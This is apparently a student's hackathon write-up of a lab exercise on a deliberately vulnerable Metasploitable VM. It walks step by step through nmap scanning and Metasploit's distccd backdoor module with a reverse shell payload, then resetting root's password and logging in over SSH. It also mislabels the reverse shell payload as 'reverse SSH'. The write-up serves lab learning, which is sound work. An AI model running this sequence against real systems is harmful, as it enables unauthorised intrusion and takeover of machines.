# 2026 Hackathon - Noontide Write-up

## Overview
This is a write-up for a Hackathon I attended in person in March 2026. This small write up will contain:
- A record of my steps & My thought process
- Conclusion
Note: If you just want to follow my steps, you can skip the Main Thoughts Section and find the Steps Section

## Thoughts, Steps & Thought Process
Following the [Advent of Cyber](/2025%20CTFs/Advent%20of%20Cyber/AoC_README.md) event, this was my first Hackathon of 2026. 
Completing this hackathon required me to setup:
- VirtualBox
- A vulnerable __Metasploitable__ Machine, networked with the Kali Machine
- An attacker __Kali Linux__ Machine, networked with the Metasploitable Machine

Metasploitable machines are specifically made to test exploits, and should **never** be exposed to the internet - but this does mean I may be able to look for exploits I can use.

Although we know both machines are on the same network, we want to figure out the IP address of the Metasploitable machine using the Kali Linux Machine.

I need to do this by using `ifconfig` to find the network I am on (standard procedure, even though we know it- it's good practice to never assume) and use `nmap`.

1. Ran `ifconfig` and observed the `eth0` inet address, because this is on a Virtual Machine, it should only show `127.0.0.1` (itself) and the network IP.

Network IP range is `10.0.2.0/24` (Kali is `10.0.2.5`)

2. Ran the command `nmap -sP 10.0.2.0/24` to scan for connected devices to the network.

For further explanation of the `/24` at the end of the IP Address, see Section 3 of my [Snort IDS Tutorial](https://github.com/rynverse/snort-tutorial) 

Now that we know what devices are on the network, we would typically need to check each device, but because our devices are the only ones on the network - we know which to target.

Now we need to find applications we can exploit using `nmap -sV 10.0.2.4` (the IP address of the Metasploitable), as this command will search for applications on that IP address.

3. Ran the command `nmap -sV 10.0.2.4`

We now know the applications running and using ports on the machine, so we can now use `msfconsole` to search for exploits by using `search [application]`
4. Ran the commands:
`sudo service postgresql start`
`sudo ss -ant`
`sudo msfdb init`
`msfconsole`

Now we need to find the vulnerabilities now that `msfconsole` is set up, 
- My initial CVE Candidate was CVE-2009-3843, 4819, 4188
This used `RHOSTS`, `RPORT`, and `PATH` - but I tried this and was unsuccessful in achieving the objective of the challenge.
Instead, I will use the `distccd` Backdoor which uses two variables `LHOST`, and `RHOST` (Local Host/Remote Host)

5. Ran the commands:
`set LHOST 10.0.2.5`
`set RHOST 10.0.2.4`

Now that we have set the variables, we need to choose a payload by using the command `show payloads` and I need to specifically look for a reverse SSH payload

6. Ran the command `set PAYLOAD cmd/unix/reverse`

Did this to set the payload as reverse SSH, time to exploit it using the command `exploit` 

7. Ran the command `exploit`

It looks like a success! Time to check if it worked running `whoami`

8. Ran the command `whoami`

Since we are root, we can change the password using the command `passwd root`

9. Ran the command `passwd root`

As I have now changed the password to root we can SSH into the machine like it is my own.

10. Ran the command `ssh -oHostKeyAlgorithms=+ssh-dss root@10.0.2.4`

Successful connection! I completed the challenge by changing the password to `root` and then SSHing into the machine.

## Steps
1. Ran `ifconfig` and observed the `eth0` inet address, because this is on a Virtual Machine, it should only show `127.0.0.1` (itself) and the network IP.
2. Ran the command `nmap -sP 10.0.2.0/24` to scan for connected devices to the network.
3. Ran the command `nmap -sV 10.0.2.4`
4. Ran command `sudo service postgresql start`
5. Ran command `sudo ss -ant`
6. Ran Command `sudo msfdb init`
7. Ran command `msfconsole`
8. Ran command `set LHOST 10.0.2.5`
9. Ran Command `set RHOST 10.0.2.4`
10. Ran the command `set PAYLOAD cmd/unix/reverse`
11. Ran the command `exploit`
12. Ran the command `whoami`
13. Ran the command `passwd root`
14. Ran the command `ssh -oHostKeyAlgorithms=+ssh-dss root@10.0.2.4`













